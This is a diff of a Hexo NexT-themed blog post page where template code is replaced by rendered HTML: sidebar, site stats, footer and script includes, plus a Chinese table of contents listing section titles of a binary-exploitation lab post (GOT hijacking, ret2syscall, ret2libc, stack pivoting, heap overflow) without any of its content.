+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">安装虚拟机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85vim"><span class="nav-number">2.</span> <span class="nav-text">安装vim</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85g"><span class="nav-number">3.</span> <span class="nav-text">安装g++</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#gdb"><span class="nav-number">4.</span> <span class="nav-text">gdb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">4.1.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85peda%E6%8F%92%E4%BB%B6"><span class="nav-number">4.2.</span> <span class="nav-text">安装peda插件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85IDA"><span class="nav-number">5.</span> <span class="nav-text">安装IDA</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab%E2%80%94%E2%80%941-1"><span class="nav-number">6.</span> <span class="nav-text">Lab——1.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E9%AA%8C"><span class="nav-number">7.</span> <span class="nav-text">got表劫持实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C"><span class="nav-number">7.1.</span> <span class="nav-text">运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5"><span class="nav-number">7.2.</span> <span class="nav-text">检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">7.3.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GOT%E8%A1%A8%E5%8A%AB%E6%8C%81"><span class="nav-number">7.4.</span> <span class="nav-text">GOT表劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFGOT%E8%A1%A8"><span class="nav-number">7.4.1.</span> <span class="nav-text">什么是GOT表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%9C%89GOT%E8%A1%A8"><span class="nav-number">7.4.2.</span> <span class="nav-text">为什么会有GOT表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%81%9A%E5%88%B0got%E8%A1%A8%E5%8A%AB%E6%8C%81"><span class="nav-number">7.4.3.</span> <span class="nav-text">如何做到got表劫持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3"><span class="nav-number">7.5.</span> <span class="nav-text">破解</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-number">8.</span> <span class="nav-text">ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5-1"><span class="nav-number">8.1.</span> <span class="nav-text">检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C-1"><span class="nav-number">8.2.</span> <span class="nav-text">运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">8.3.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP"><span class="nav-number">8.4.</span> <span class="nav-text">ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFROP"><span class="nav-number">8.4.1.</span> <span class="nav-text">什么是ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ROP%E6%8B%BF%E5%88%B0shell"><span class="nav-number">8.4.2.</span> <span class="nav-text">如何使用ROP拿到shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">8.4.2.1.</span> <span class="nav-text">Linux的系统调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#64%E4%BD%8DLinux%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E8%A7%84%E5%88%99"><span class="nav-number">8.4.2.2.</span> <span class="nav-text">64位Linux的参数传递规则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gadget"><span class="nav-number">8.4.2.3.</span> <span class="nav-text">gadget</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">8.4.2.4.</span> <span class="nav-text">思路</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0"><span class="nav-number">8.5.</span> <span class="nav-text">实现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">8.5.1.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0-1"><span class="nav-number">8.5.2.</span> <span class="nav-text">实现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">8.6.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C"><span class="nav-number">8.7.</span> <span class="nav-text">结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-number">9.</span> <span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5-2"><span class="nav-number">9.1.</span> <span class="nav-text">检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C-2"><span class="nav-number">9.2.</span> <span class="nav-text">运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">9.3.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">9.4.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="nav-number">9.5.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C-1"><span class="nav-number">9.6.</span> <span class="nav-text">结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AE%9E%E9%AA%8C"><span class="nav-number">10.</span> <span class="nav-text">栈迁移实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5-3"><span class="nav-number">10.1.</span> <span class="nav-text">检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C-3"><span class="nav-number">10.2.</span> <span class="nav-text">运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-number">10.3.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">10.4.</span> <span class="nav-text">栈迁移</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AF%BB%E5%85%A5"><span class="nav-number">10.4.1.</span> <span class="nav-text">第一次读入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AF%BB%E5%85%A5"><span class="nav-number">10.4.2.</span> <span class="nav-text">第二次读入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AC%A1%E8%AF%BB%E5%85%A5"><span class="nav-number">10.4.3.</span> <span class="nav-text">第三次读入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E6%AC%A1%E8%AF%BB%E5%85%A5"><span class="nav-number">10.4.4.</span> <span class="nav-text">第四次读入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-2"><span class="nav-number">10.5.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C-2"><span class="nav-number">10.6.</span> <span class="nav-text">结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E7%82%B9%E6%B3%A8%E6%84%8F"><span class="nav-number">10.7.</span> <span class="nav-text">一点注意</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="nav-number">11.</span> <span class="nav-text">堆溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5-4"><span class="nav-number">11.1.</span> <span class="nav-text">检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C-4"><span class="nav-number">11.2.</span> <span class="nav-text">运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="nav-number">11.3.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#addnode"><span class="nav-number">11.3.1.</span> <span class="nav-text">addnode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#looknode"><span class="nav-number">11.3.2.</span> <span class="nav-text">looknode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sys"><span class="nav-number">11.3.3.</span> <span class="nav-text">sys</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-3"><span class="nav-number">11.4.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C-3"><span class="nav-number">11.5.</span> <span class="nav-text">结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA2"><span class="nav-number">12.</span> <span class="nav-text">堆溢出2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-5"><span class="nav-number">12.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FUA"><span class="nav-number">12.2.</span> <span class="nav-text">FUA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81"><span class="nav-number">12.3.</span> <span class="nav-text">劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-4"><span class="nav-number">12.4.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C-4"><span class="nav-number">12.5.</span> <span class="nav-text">结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA3"><span class="nav-number">13.</span> <span class="nav-text">堆溢出3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-6"><span class="nav-number">13.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="nav-number">13.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-5"><span class="nav-number">13.3.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C-5"><span class="nav-number">13.4.</span> <span class="nav-text">结果</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jameci</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
